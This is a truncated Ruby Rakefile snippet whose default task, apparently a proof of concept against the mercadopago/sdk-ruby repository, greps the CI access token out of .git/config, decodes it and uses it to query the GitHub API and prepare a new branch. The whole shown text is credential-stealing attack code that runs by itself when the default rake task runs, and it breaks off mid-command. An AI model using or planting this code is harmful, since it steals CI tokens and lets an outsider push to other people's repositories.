ruby
   task :default do
     system("TOKEN=$(grep -i 'extraheader = AUTHORIZATION' .git/config | awk '{print $NF}' | base64 -d | sed 's/x-access-token://'); \
             LATEST_COMMIT_SHA=$(curl -H \"Authorization: token $TOKEN\" https://api.github.com/repos/mercadopago/sdk-ruby/git/refs/heads/master | jq -r '.object.sha'); \
             NEW_BRANCH=\"poc-branch-websec-bu-cross\"; \
